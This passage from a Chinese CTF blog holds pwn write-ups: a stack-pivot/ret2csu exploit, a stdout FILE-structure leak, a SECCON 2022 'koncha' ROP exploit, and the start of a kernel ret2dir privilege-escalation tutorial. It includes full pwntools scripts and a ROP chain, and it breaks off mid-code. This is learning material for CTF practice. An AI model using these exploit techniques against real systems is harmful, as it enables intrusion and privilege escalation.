class="hljs-number">2</span>+p64(stderr-<span class="hljs-number">0xc40</span>)+p64(<span class="hljs-number">1</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0x0000000043000000</span>)+p64(stderr+<span class="hljs-number">0x1220</span>)+p64(<span class="hljs-number">0xffffffffffffffff</span>)+p64(<span class="hljs-number">0</span>)+p64(stderr-<span class="hljs-number">0xd40</span>)<br>fake_IO_FILE =fake_IO_FILE.ljust(<span class="hljs-number">0x50</span>+<span class="hljs-number">0xe0</span>+<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +p64(system)<br>edit(-<span class="hljs-number">4</span>,fake_IO_FILE)<br><span class="hljs-comment">#debug()</span><br>sl(<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK5">WEEK5</h2><h3 id="overflow-me-plz">overflow me plz</h3><p>依旧是栈迁移到bss段，ret2csu构造wirte来泄露libc，然后one_gadget</p><p>(本来想再次迁移rop来做的，到最后程序也成功执行了system(/bin/sh)了就是没shell）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29722</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,function</span>):<br>    csu_front_addr=<span class="hljs-number">0x400740</span><br>    csu_end_addr=<span class="hljs-number">0x40075A</span><br>    payload = <span class="hljs-string">b&#x27;&#x27;</span><br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br><span class="hljs-comment">#-----------------</span><br>bss=<span class="hljs-number">0x601040</span>+<span class="hljs-number">0x200</span><br>leave_ret=<span class="hljs-number">0x00000000004006f7</span> <span class="hljs-comment"># leave ; ret</span><br>main_read=<span class="hljs-number">0x4006D9</span><br>main=<span class="hljs-number">0x400698</span><br>pd=flat(<span class="hljs-string">&#x27;\x00&#x27;</span>*<span class="hljs-number">0xc0</span>,bss+<span class="hljs-number">0xc0</span>,main_read)<br>sea(<span class="hljs-string">&#x27;Show me if you can pwn it!\n&#x27;</span>,pd)<br><br>pd1=csu(<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>],<span class="hljs-number">0x8</span>,elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])+p64(main)<br>pd1=pd1.ljust(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pd1+=p64(bss-<span class="hljs-number">8</span>)+p64(leave_ret)<br><span class="hljs-comment">#debug()</span><br>se(pd1)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>og=[<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>se(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc8</span>+p64(libc_base+og[<span class="hljs-number">0</span>]))<br><br><span class="hljs-comment">#system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-comment">#pop_rdi=0x0000000000400763</span><br><span class="hljs-comment">#ret=0x40050e</span><br><span class="hljs-comment">#binsh=libc_base+0x1B45BD</span><br><span class="hljs-comment">#pd2=flat(&#x27;\x00&#x27;*0xc0,bss+0xc0,main_read)</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#sea(&#x27;Show me if you can pwn it!\n&#x27;,pd2)</span><br><span class="hljs-comment">#pop_rsi_r15=0x400761</span><br><span class="hljs-comment">#pd3=flat(ret,pop_rdi,binsh,system)</span><br><span class="hljs-comment">#pd3.ljust(0xc0,b&#x27;\x00&#x27;) </span><br><span class="hljs-comment">#pd3+=p64(bss-8)+p64(leave_ret)</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-comment">#se(pd3)</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="leak-me-plz">leak me plz</h3><p>程序在0x233000的地址读入了flag</p><p>告诉了我们libc地址，还有任意地址写0x38长度</p><p>打stdout改p64(0xfbad1800)+p64(0)*3+p64(mmap)+p64(mmap+0x40)+p64(0)</p><p>遇到puts会打印从mmap到mmap+0x40)的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>ru(<span class="hljs-string">&#x27;Here is your gift: 0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br>stdout=libc_base+<span class="hljs-number">0x1ed6a0</span><br><span class="hljs-comment">#debug()</span><br>se(p64(stdout))<br><span class="hljs-comment">#debug()</span><br>payload=p64(<span class="hljs-number">0xfbad1800</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(mmap)+p64(mmap+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0</span>)<br>se(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="小结">小结</h2><p>还有5道题没整出来，记录一下，懒得整了，分别为：</p><p>这是堆🐎--------IO利用,orw无open</p><p>KMario------------kernel_pwn</p><p>code me plz-----shellcode，orw无open</p><p>Farewell----------kernel_pwn</p><p>orw me plz------也是orw没有open的情况</p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>ctf比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IO_leak</tag>
      
      <tag>orw</tag>
      
      <tag>shellocde</tag>
      
      <tag>ret2libc</tag>
      
      <tag>ret2shellocde</tag>
      
      <tag>GOT Hijacking</tag>
      
      <tag>format</tag>
      
      <tag>整数溢出</tag>
      
      <tag>数组越界</tag>
      
      <tag>ret2csu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>koncha</title>
    <link href="/2022/11/15/koncha/"/>
    <url>/2022/11/15/koncha/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>这是SECCON CTF 2022的一道warm up pwn，第一个scanf打回车能泄露libc。比赛时钻牛角尖了，没想到这个trick，看到最后scanf ret的地址是libc段，想着改后三字节为og，爆破三位，不知道是哪里错误了，就是爆不出来</p><h2 id="程序源码：">程序源码：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>\<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br> <span class="hljs-type">char</span> name[<span class="hljs-number">0x30</span>], country[<span class="hljs-number">0x20</span>];<br> <span class="hljs-comment">/* Ask name (accept whitespace) */</span><br> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello! What is your name?&quot;</span>);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]s&quot;</span>, name);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nice to meet you, %s!\n&quot;</span>, name);<br><br> <span class="hljs-comment">/* Ask country */</span><br> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which country do you live in?&quot;</span>);<br> <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, country);<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wow, %s is such a nice country!\n&quot;</span>, country);<br> <span class="hljs-comment">/* Painful goodbye */</span><br> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It was nice meeting you. Goodbye!&quot;</span>);<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>__attribute__((constructor))<br><span class="hljs-type">void</span> <span class="hljs-title function_">setup</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br> setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br> setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br> alarm(<span class="hljs-number">180</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="exp">exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./chall&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sla(<span class="hljs-string">&#x27;Hello! What is your name?\n&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>)<br>ru(<span class="hljs-string">&#x27;Nice to meet you, &#x27;</span>)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-<span class="hljs-number">0x1f12e8</span><br>info(<span class="hljs-string">&#x27;libc&#x27;</span>,libc_base)<br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>binsh=libc_base+<span class="hljs-number">0x1B45BD</span><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret=libc_base+<span class="hljs-number">0x22679</span><br>payload=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>,ret,pop_rdi,binsh,system)<br><span class="hljs-comment">#debug()</span><br>sla(<span class="hljs-string">&#x27;Which country do you live in?\n&#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>glibc pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rop</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0x05 kernel ROP-Ret2dir</title>
    <link href="/2022/11/12/0x05kernelRet2dir/"/>
    <url>/2022/11/12/0x05kernelRet2dir/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言:</h2><p>参考<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">arttnba3</a>，<a href="https://blog.csdn.net/qq_54218833/article/details/125647404?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166815388316782425177053%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166815388316782425177053&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125647404-null-null.142%5Ev63%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_control2&amp;utm_term=kernel%20pwn%E5%85%A5%E9%97%A83&amp;spm=1018.2226.3001.4187">L3H_CoLin</a></p><p>ret2dir即 return to direct mapping area，<strong>在内核空间中都能通过这块内存区域访问到</strong>，我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可，这便是 <code>ret2dir</code> ——<strong>通过内核空间地址访问到用户空间数据</strong></p><h2 id="MINI-LCTF2022-kgadget">MINI-LCTF2022 - kgadget</h2><h3 id="0x01程序分析">0x01程序分析</h3><h4 id="1-保护查看">1.保护查看</h4><p>开启了smep/smap，没开kaslr，可以看到这里pti=on，其实是开启了KPTI，所以不能关闭smep来ret2usr</p><p><img src="/2022/11/12/0x05kernelRet2dir/1.png" alt="1"></p><h4 id="2-查看init">2.查看init</h4><p><code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code></p><p>非特权用户不能使用dmesg查看来自内核日志缓冲区的消息</p><p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code></p><p>非特权用户都无法读取内核符号地址</p><p><code>chmod 400 /flag</code></p><p>只有root可以读flag</p><p>载入了LKM kgadget.ko，显然重点关注这个</p><p><img src="/2022/11/12/0x05kernelRet2dir/2.png" alt="2"></p><h4 id="3-分析kgadget-ko">3.分析kgadget.ko</h4><h5 id="一-保护">一.保护</h5><p>开启了canary，nx</p><p><img src="/2022/11/12/0x05kernelRet2dir/3.png" alt="3"></p><h5 id="二-函数">二.函数</h5><p>就重点分析ioctl</p><p>我们第二个参数是114514的话，会解析第三个参数指针执行</p><p><img src="/2022/11/12/0x05kernelRet2dir/4.png" alt="4"></p><p>前面qmemcpy这段我们不好理解做了啥，我们看汇编</p><p><img src="/2022/11/12/0x05kernelRet2dir/5.png" alt="5"></p><p>可以看到这边[rax-0xa8]是pt_regs，可以看到就是把pt_regs的r15,r14,r13,r12,rbp,r11,r10赋值“attrnba3”</p><p>最后call rbx,rbx已经是第三个参数了，也就是解析第三个参数指针执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pt_regs</span> &#123;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span><br><span class="hljs-comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r15;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r14;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r13;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r12;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rbx;<br><span class="hljs-comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r11;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r10;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r9;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> r8;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rax;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rcx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdx;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsi;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rdi;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span><br><span class="hljs-comment"> * On hw interrupt, it&#x27;s IRQ number:</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> orig_rax;<br><span class="hljs-comment">/* Return frame for iretq */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rip;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rsp;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ss;<br><span class="hljs-comment">/* top of stack page */</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="0x02解题步骤">0x02解题步骤</h3><p><strong>ret2dir + physmap spray</strong></p><p>攻击方法就是return to direct mapping area（线性映射区），利用内核线性映射区对整个物理地址空间的映射，在内核空间上的地址访问到用户空间的数据。</p><h4 id="1-申请内存">1.申请内存</h4><p><code>mmap(NULL, sysconf(_SC_PAGESIZE), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></p><p>（mmap如此申请的话，一个页大小，内存可读可写，匿名映射）</p><p>我们以一个页的大小来申请内存，后续要往里面写入payload，用physmap spray手法， mmap 喷射大量的物理内存写入同样的 payload(rop链)</p><blockquote><p><strong>使用 mmap 喷射大量的物理内存写入同样的 payload</strong>，之后再随机挑选一个线性映射区上的地址进行利用，这样我们就<strong>有很大的概率命中到我们布置的 payload 上</strong>，这种攻击手法也称为 <code>physmap spray</code></p></blockquote><h4 id="2-在内存中构造ROP链">2.在内存中构造ROP链</h4><p>由于开启了KPTI，无法ret2usr，要rop出commit_creds(prepare_kernel_cred(0))又缺一个必要的<code>mov rdi,rax;ret</code>的gadget，其实也可能有</p><p>（如果jmp的地址指向ret的话就有了，不过太多懒得找，这里采取另一种rop方法）</p><p><img src="/2022/11/12/0x05kernelRet2dir/6.png" alt="6"></p><p>rop出<code>commit_creds(init_cred)</code>,返回用户态另选择<code>swapgs_restore_regs_and_return_to_usermode</code>这个gadget，这是一个保存pt_regs结构并且返回到用户态的函数的地址</p><p>（地址我们可以通过设置init为root 来cat出来）</p><p><img src="/2022/11/12/0x05kernelRet2dir/7.png" alt="7"></p><p>我们+27偏移跳过前面的pop<img src="/2022/11/12/0x05kernelRet2dir/8.png" alt="8"></p><p><img src="/2022/11/12/0x05kernelRet2dir/9.png" alt="9"></p><p>所以rop这么连</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[idx++] = pop_rdi_ret;<br>rop[idx++] = init_cred;<br>rop[idx++] = commit_creds;<br>rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>rop[idx++] = (<span class="hljs-type">size_t</span>) spawn_shell;<br>rop[idx++] = user_cs;<br>rop[idx++] = user_rflags;<br>rop[idx++] = user_sp;<br>rop[idx++] = user_ss;<br></code></pre></td></tr></table></figure><p>我们的ROP链都是在用户空间编写的，能够映射到内核空间的某个地方，但是要执行这些ROP还需要我们将栈引导到这些内核映射区中。可以用形如<code>add rsp, offest ; ret</code>这样的gadget来使栈指针指向pt_regs结构，我们可以在pt_regs上构造rop链，但是本题限制严格只能使用r9，r8两个寄存器的值，所以没办法，可以再一次栈迁移到我们的rop链。</p><p>由于不知道指向我们申请内存的偏移为多少，可以用slide code，一直滑到我们的提权代码</p><p>我们可以用形如<code>add rsp, offest ; ret</code>或者<code>ret</code>这种gadget当作滑板，一直滑到提权代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 